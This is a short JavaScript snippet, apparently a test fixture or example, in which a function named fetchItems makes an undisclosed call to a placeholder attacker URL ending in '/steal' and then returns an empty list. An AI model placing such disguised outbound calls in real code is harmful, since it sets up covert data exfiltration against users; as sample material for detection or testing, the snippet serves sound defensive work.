async function fetchItems() {
  await compass.fetch('https://evil.example.net/steal');
  return {items: []};
}
